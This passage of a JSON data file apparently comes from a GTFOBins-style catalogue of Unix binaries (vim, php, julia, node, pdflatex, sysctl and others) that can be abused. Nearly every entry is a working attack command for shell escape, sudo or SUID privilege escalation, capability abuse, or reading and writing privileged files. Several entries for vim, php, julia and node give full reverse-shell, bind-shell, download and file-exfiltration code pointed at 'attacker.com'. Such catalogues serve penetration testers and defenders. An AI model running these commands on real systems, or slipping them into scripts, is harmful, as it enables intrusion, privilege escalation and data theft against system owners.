          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./awk 'BEGIN {system(\"/bin/sh\")}'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "pdflatex": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "ansible-test": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ansible-test shell",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo ansible-test shell",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "pico": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "pico\n^R^X\nreset; sh 1>&0 2>&0\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "pico -s /bin/sh\n/bin/sh\n^T\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "pico file_to_write\nDATA\n^O\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "pico file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "limited-suid": [
        {
          "code": "./pico -s /bin/sh\n/bin/sh\n^T\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "valgrind": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "valgrind /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo valgrind /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "zypper": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "zypper x\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nexport PATH=$TF:$PATH\nzypper x\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo zypper x\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ksshell": {
    "description": "Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nksshell -i $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./ksshell -i $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo ksshell -i $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "knife": {
    "description": "This is capable of running [`ruby`](/gtfobins/ruby/) code.",
    "functions": {
      "shell": [
        {
          "code": "knife exec -E 'exec \"/bin/sh\"'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo knife exec -E 'exec \"/bin/sh\"'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "od": {
    "description": "Three spaces are added before each character in the read file, and non-printable chars are printed as backslash escape sequences.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nod -An -c -w9999 \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "xelatex": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "julia": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "julia -e 'run(`/bin/sh`)'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-read": [
        {
          "code": "export LFILE=file_to_read\njulia -e 'print(open(f->read(f, String), ENV[\"LFILE\"]))'\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "export LFILE=file_to_write\njulia -e 'open(f->write(f, \"DATA\"), ENV[\"LFILE\"], \"w\")'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\njulia -e 'download(ENV[\"URL\"], ENV[\"LFILE\"])'\n",
          "description": "It can download remote files."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\njulia -e 'using Sockets; sock=connect(ENV[\"RHOST\"], parse(Int64,ENV[\"RPORT\"])); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "suid": [
        {
          "code": "./julia -e 'run(`/bin/sh -p`)'\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo julia -e 'run(`/bin/sh`)'\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "php": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "export CMD=\"/bin/sh\"\nphp -r 'system(getenv(\"CMD\"));'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "export CMD=\"/bin/sh\"\nphp -r 'passthru(getenv(\"CMD\"));'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "export CMD=\"/bin/sh\"\nphp -r 'print(shell_exec(getenv(\"CMD\")));'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "export CMD=\"/bin/sh\"\nphp -r '$r=array(); exec(getenv(\"CMD\"), $r); print(join(\"\\\\n\",$r));'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "export CMD=\"/bin/sh\"\nphp -r '$h=@popen(getenv(\"CMD\"),\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "command": [
        {
          "code": "export CMD=\"id\"\nphp -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(getenv(\"CMD\"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'\n",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nphp -r '$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "LHOST=0.0.0.0\nLPORT=8888\nphp -S $LHOST:$LPORT\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nphp -r '$c=file_get_contents(getenv(\"URL\"));file_put_contents(getenv(\"LFILE\"), $c);'\n",
          "description": "It can download remote files."
        }
      ],
      "suid": [
        {
          "code": "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "capabilities": [
        {
          "code": "CMD=\"/bin/sh\"\n./php -r \"posix_setuid(0); system('$CMD');\"\n",
          "description": "If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."
        }
      ],
      "file-read": [
        {
          "code": "export LFILE=file_to_read\nphp -r 'readfile(getenv(\"LFILE\"));'\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-write": [
        {
          "code": "export LFILE=file_to_write\nphp -r 'file_put_contents(getenv(\"LFILE\"), \"DATA\");'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ]
    }
  },
  "sysctl": {
    "description": "",
    "functions": {
      "command": [
        {
          "code": "COMMAND='/bin/sh -c id>/tmp/id'\nsysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n",
          "description": "It can be used to break out from restricted environments by running non-interactive system commands."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\n/usr/sbin/sysctl -n \"/../../$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "COMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "msgconv": {
    "description": "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nmsgconv -P $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo msgconv -P $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./msgconv -P $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "vim": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "vim -c ':!/bin/sh'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "vim --cmd ':set shell=/bin/sh|:shell'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "vim -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n",
          "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-bind-shell": [
        {
          "code": "export LPORT=12345\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n",
          "description": "It can bind a non-interactive shell to a local port to allow remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export LPORT=8888\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n",
          "description": "It can download remote files."
        },
        {
          "code": "export LPORT=12345\nexport LFILE=file_to_save\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "vim file_to_write\niDATA\n^[\nw\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "vim file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "suid": [
        {
          "code": "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo vim -c ':!/bin/sh'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo vim -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "capabilities": [
        {
          "code": "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."
        }
      ],
      "limited-suid": [
        {
          "code": "./vim -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "chmod": {
    "description": "This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.",
    "functions": {
      "suid": [
        {
          "code": "LFILE=file_to_change\n./chmod 6777 $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "hd": {
    "description": "The output is actually an hex dump.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nhd \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./hd \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo hd \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "cowthink": {
    "description": "It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply.",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowthink -f $TF x\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "start-stop-daemon": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "start-stop-daemon -n $RANDOM -S -x /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ascii85": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nascii85 \"$LFILE\" | ascii85 --decode\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo ascii85 \"$LFILE\" | ascii85 --decode\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "node": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "node -e 'require(\"fs\").writeFileSync(\"file_to_write\", \"DATA\")'",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/bin/ls\"))'",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nnode -e 'require(\"http\").get(process.env.URL, res => res.pipe(require(\"fs\").createWriteStream(process.env.LFILE)))'\n",
          "description": "It can download remote files."
        }
      ],
      "file-upload": [
        {
          "code": "export URL=http://attacker.com\nexport LFILE=file_to_send\nnode -e 'require(\"fs\").createReadStream(process.env.LFILE).pipe(require(\"http\").request(process.env.URL))'\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nnode -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").connect(process.env.RPORT, process.env.RHOST, function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'\n",
